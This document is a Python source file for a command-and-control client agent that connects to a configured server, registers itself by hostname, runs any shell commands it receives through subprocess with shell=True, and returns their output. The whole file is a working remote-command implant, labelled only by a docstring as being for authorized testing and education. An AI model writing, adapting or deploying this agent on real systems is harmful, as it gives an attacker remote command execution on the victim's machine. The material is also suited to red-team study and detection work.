"""
C2 Client Implementation

This module implements the command and control client (agent) that:
- Connects to the C2 server
- Registers itself with hostname information
- Receives commands from the server
- Executes commands locally using subprocess
- Sends results back to the server

This is for authorized security testing and educational purposes only.
"""

import socket
import subprocess
import sys
import time
import uuid
from datetime import datetime
from typing import Optional, Tuple

# Import common modules (PYTHONPATH should include project root)
from common import config, protocol


def display_banner():
    """
    Display the client startup banner with configuration info.
    """
    print("=" * 60)
    print("C2 CLIENT - Command and Control Agent")
    print("=" * 60)
    print(f"Target Server: {config.SERVER_HOST}:{config.SERVER_PORT}")
    print(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Client ID: {socket.gethostname()}")
    print("=" * 60)
    print()


def connect_to_server() -> Optional[socket.socket]:
    """
    Connect to the C2 server with retry logic.

    Attempts to establish a TCP connection to the server.
    Will retry multiple times with exponential backoff on failure.

    Returns:
        socket.socket: Connected socket if successful
        None: If all connection attempts fail
    """
    retry_count = 0
    delay = config.CONNECTION_RETRY_DELAY

    while retry_count <= config.MAX_CONNECTION_RETRIES:
        try:
            print(f"[*] Attempting to connect to {config.SERVER_HOST}:{config.SERVER_PORT}...")

            # Create TCP socket
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Attempt connection
            client_socket.connect((config.SERVER_HOST, config.SERVER_PORT))

            print(f"[+] Connected successfully to {config.SERVER_HOST}:{config.SERVER_PORT}")
            print()

            return client_socket

        except ConnectionRefusedError:
            print(f"[!] Connection refused. Server may not be running.")
            retry_count += 1

            if retry_count <= config.MAX_CONNECTION_RETRIES:
                print(f"[*] Retrying in {delay} seconds... (Attempt {retry_count}/{config.MAX_CONNECTION_RETRIES})")
                time.sleep(delay)
                delay *= 2  # Exponential backoff
            else:
                print(f"[!] Maximum retry attempts ({config.MAX_CONNECTION_RETRIES}) reached.")
                return None

        except socket.gaierror:
            print(f"[!] ERROR: Cannot resolve hostname {config.SERVER_HOST}")
            return None

        except OSError as e:
            print(f"[!] ERROR: Network error - {e}")
            retry_count += 1

            if retry_count <= config.MAX_CONNECTION_RETRIES:
                print(f"[*] Retrying in {delay} seconds... (Attempt {retry_count}/{config.MAX_CONNECTION_RETRIES})")
                time.sleep(delay)
                delay *= 2
            else:
                print(f"[!] Maximum retry attempts ({config.MAX_CONNECTION_RETRIES}) reached.")
                return None

        except Exception as e:
            print(f"[!] ERROR: Unexpected error during connection - {e}")
            return None

    return None


def send_registration(client_socket: socket.socket) -> bool:
    """
    Creates and sends a registration message containing the client's
    hostname and timestamp.

    Args:
        client_socket: The connected socket to the server

    Returns:
        bool: True if registration sent successfully, False otherwise
    """
    try:
        # Get client identifier (hostname + unique suffix for multi-client support)
        hostname = socket.gethostname()
        unique_suffix = uuid.uuid4().hex[:4]  # 4-character random hex (e.g., 'a1b2')
        client_id = f"{hostname}-{unique_suffix}"

        # Create registration message
        registration_message = {
            'type': 'registration',
            'client_id': client_id,
            'timestamp': datetime.now().isoformat()
        }

        print(f"[*] Sending registration as: {client_id}")

        # Send registration using protocol
        success = protocol.send_message(client_socket, registration_message)

        if success:
            print("[+] Registration sent successfully")
            print()
            return True
        else:
            print("[!] ERROR: Failed to send registration")
            return False

    except Exception as e:
        print(f"[!] ERROR: Registration failed - {e}")
        return False


def execute_command(command: str) -> Tuple[str, str, int]:
    """
    Execute a shell command locally and capture output.

    Uses subprocess to execute the command with timeout protection.
    Captures both stdout and stderr separately.

    Args:
        command: The shell command to execute

    Returns:
        tuple: (stdout, stderr, return_code)
            - stdout: Standard output as string
            - stderr: Standard error as string
            - return_code: Process exit code (0 = success)
    """
    try:
        # Execute command with timeout and output capture
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=config.COMMAND_TIMEOUT
        )

        # Return captured output and return code
        return result.stdout, result.stderr, result.returncode

    except subprocess.TimeoutExpired:
        # Command exceeded timeout
        error_msg = f"Command timed out after {config.COMMAND_TIMEOUT} seconds"
        return "", error_msg, -1

    except Exception as e:
        # Unexpected error during execution
        error_msg = f"Command execution error: {str(e)}"
        return "", error_msg, -1


def send_result(client_socket: socket.socket, command: str, stdout: str, stderr: str, return_code: int) -> bool:
    """
    Send command execution result back to the server.

    Creates and sends a result message containing the command output,
    errors, and return code.

    Args:
        client_socket: The connected socket to the server
        command: The command that was executed
        stdout: Standard output from the command
        stderr: Standard error from the command
        return_code: Exit code from the command

    Returns:
        bool: True if result sent successfully, False otherwise
    """
    try:
        # Create result message
        result_message = {
            'type': 'result',
            'command': command,
            'stdout': stdout,
            'stderr': stderr,
            'return_code': return_code,
            'timestamp': datetime.now().isoformat()
        }

        # Send result using protocol
        success = protocol.send_message(client_socket, result_message)

        if not success:
            print("[!] WARNING: Failed to send result to server")

        return success

    except Exception as e:
        print(f"[!] ERROR: Failed to send result - {e}")
        return False


def main_loop(client_socket: socket.socket):
    """
    Main command receive and execute loop.

    Continuously waits for commands from the server, executes them,
    and sends results back. Runs until connection is lost or error occurs.

    Args:
        client_socket: The connected socket to the server
    """
    print("=" * 60)
    print("COMMAND LOOP - Waiting for commands from server...")
    print("=" * 60)
    print()

    try:
        while True:
            # Receive command from server
            command_message = protocol.receive_message(client_socket)

            if command_message is None:
                print("[!] ERROR: Connection lost or invalid message received")
                print("[!] Exiting...")
                break

            # Validate message type
            if command_message.get('type') != 'command':
                print(f"[!] WARNING: Unexpected message type: {command_message.get('type')}")
                continue

            # Extract command
            command = command_message.get('command')

            if not command:
                print("[!] WARNING: Received empty command")
                continue

            # Display command being executed
            print(f"[*] Executing command: {command}")

            # Execute the command
            stdout, stderr, return_code = execute_command(command)

            # Display execution summary
            print(f"[*] Command completed with return code: {return_code}")

            # Send result back to server
            success = send_result(client_socket, command, stdout, stderr, return_code)

            if not success:
                print("[!] ERROR: Failed to send result. Connection may be lost.")
                print("[!] Exiting...")
                break

            print()  # Blank line for readability

    except KeyboardInterrupt:
        # Handle Ctrl+C
        print()
        print("[*] Keyboard interrupt received. Exiting...")
    except Exception as e:
        print(f"[!] ERROR: Unexpected error in main loop - {e}")


def main():
    """
    Main entry point for the C2 client.

    Orchestrates the client connection, registration, and command loop.
    """
    # Display banner
    display_banner()

    # Connect to server
    client_socket = connect_to_server()

    if client_socket is None:
        print("[!] Failed to connect to server. Exiting.")
        sys.exit(1)

    try:
        # Send registration
        success = send_registration(client_socket)

        if not success:
            print("[!] Registration failed. Exiting.")
            client_socket.close()
            sys.exit(1)

        # Enter main command loop
        main_loop(client_socket)

    finally:
        # Cleanup
        print()
        print("[*] Cleaning up...")
        try:
            client_socket.close()
            print("[*] Connection closed")
        except:
            pass

        print("[*] Client shutdown complete")


if __name__ == '__main__':
    main()
